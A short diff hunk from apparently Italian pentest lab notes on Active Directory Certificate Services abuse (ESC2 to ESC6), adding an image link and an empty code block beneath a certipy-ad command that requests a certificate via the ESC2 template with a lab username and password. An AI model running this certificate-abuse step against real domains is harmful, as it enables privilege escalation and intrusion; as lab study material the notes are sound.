@@ -233,6 +233,11 @@ Prendi il certificato usando certipy
 ```bash
 certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
 ```
+![[Pasted image 20230828150256.png]]
+```bash
+
+```
+
 ### **ESC 3 - ADCS**
 ### **ESC 4 - ADCS**
 ### **ESC 6 - ADCS**
